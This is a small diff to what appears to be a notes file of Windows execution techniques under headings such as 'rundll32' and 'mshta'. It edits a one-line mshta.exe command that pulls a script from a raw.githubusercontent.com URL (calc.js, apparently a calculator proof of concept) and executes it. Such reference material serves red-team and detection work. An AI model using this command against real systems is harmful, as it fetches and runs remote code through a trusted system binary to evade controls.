@@ -9,4 +9,4 @@ rundll32<br><br>
 <br>
 mshta 
 <br><br>
-`mshta.exe javascript:GetObject("script:https://raw.githubusercontent.com/sailay1996/misc-bin/master/calc.js …");close();`
+`mshta.exe javascript:GetObject("script:https://raw.githubusercontent.com/sailay1996/misc-bin/master/calc.js");close();`
